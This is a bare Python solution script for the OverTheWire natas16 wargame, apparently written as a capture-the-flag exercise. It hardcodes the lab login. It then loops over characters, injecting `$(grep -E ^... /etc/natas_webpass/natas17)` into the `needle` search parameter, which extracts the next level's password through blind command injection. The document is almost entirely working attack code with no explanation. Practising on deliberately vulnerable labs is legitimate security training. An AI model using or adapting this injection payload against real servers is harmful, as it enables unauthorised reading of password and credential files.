import requests


url = "http://natas16.natas.labs.overthewire.org"
user = "natas16"
passw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
alpha = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
start = "$(grep -E ^"
path = " /etc/natas_webpass/natas17)yes"
final = ""
for i in range(0, 32):
    cur = 0
    done = False
    while not done:
        prepay = start + final + str(alpha[cur]) + path #python is angry about type conversion (implicit types suck balls)
        payload = {'needle':prepay}
        r = requests.get(url, auth=(user, passw), params=payload)
        if "yes" not in r.text:
            final = final + str(alpha[cur])
            print(final)
            done = True
        else:
            cur += 1
 
    